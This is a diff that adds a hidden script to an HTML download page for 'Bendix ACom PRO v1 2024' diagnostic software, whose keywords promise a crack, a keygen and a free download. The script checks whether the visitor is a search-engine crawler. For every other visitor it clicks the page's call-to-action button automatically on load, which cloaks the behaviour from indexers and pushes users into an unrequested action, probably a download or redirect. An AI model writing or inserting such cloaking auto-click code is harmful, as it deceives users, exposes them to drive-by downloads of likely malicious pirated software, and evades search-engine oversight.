@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bendix ACom PRO v1 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Bendix ACom PRO v1 2024 - diagnostic software for troubleshooting, repair, and recalibration of Bendix systems on vehicles and trailers.">
     <meta name="keywords" content="Bendix ACom v1 2024, Bendix ACom v1 diagnostic software, Bendix ACom v1 2024 download, Bendix ACom v1 2024 free download, Bendix ACom v1 crack, Bendix ACom v1 keygen, Bendix diagnostic software, Bendix diagnostic software download, Bendix diagnostic software download free, Bendix diagnostic software crack, Bendix diagnostic software keygen, скачать Bendix ACom v1 2024, скачать Bendix диагностическое ПО, скачать Bendix ACom v1 2024 бесплатно, скачать Bendix ACom v1 кряк, ключ для Bendix ACom v1 2024, Bendix ACom v1 2024 полный скачивание, Bendix ACom v1 2024 скачать бесплатно, Bendix ACom v1 2024 ключ">
     <style>
